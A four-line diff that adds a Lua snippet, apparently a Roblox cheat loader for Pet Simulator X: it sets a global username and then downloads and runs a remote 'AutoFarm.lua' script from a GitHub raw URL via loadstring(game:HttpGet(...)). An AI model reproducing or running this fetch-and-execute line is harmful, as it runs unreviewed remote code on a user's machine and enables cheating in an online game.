@@ -1,0 +1,4 @@
+
+_G.UserName = "SphynxlKNTX"  
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXScripts/main/AutoFarm.lua'))()
